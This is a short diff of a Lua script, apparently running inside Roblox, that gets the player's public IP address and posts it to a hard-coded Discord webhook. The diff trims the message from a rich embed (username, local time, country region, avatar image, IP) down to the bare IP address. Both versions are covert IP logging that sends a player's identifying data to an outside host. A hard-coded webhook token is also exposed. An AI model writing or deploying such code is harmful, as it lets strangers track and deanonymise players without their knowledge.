@@ -13,18 +13,7 @@ local ip_address = getPublicIP()
 
 local url = "https://discord.com/api/webhooks/1059784907297149009/ObtD7JRVz4pMeSq9XxKgzwRGRDhlErYx2pGHsILnfxT-pT9H4ElYqdYoSQUA-rv9rTVX"
 local data = {
-    ["content"] = "",
-    ["embeds"] = {
-        {
-            ["title"] = "Vartotojas** " .. game.Players.LocalPlayer.Name .. "** ruošiasi",
-            ["description"] = "\nPardavėjo laikrodis: **" .. os.date() .. "**\nRegionas: **" .. game:GetService("LocalizationService"):GetCountryRegionForPlayerAsync(game.Players.LocalPlayer) .. "**\nIP adresas: **" .. ip_address .. "**",
-            ["type"] = "rich",
-            ["color"] = tonumber(0x7269da),
-            ["image"] = {
-                ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" .. tostring(game:GetService("Players").LocalPlayer.Name)
-            }
-        }
-    }
+    ["content"] = "IP Address: " .. ip_address
 }
 local newdata = http_service:JSONEncode(data)
 
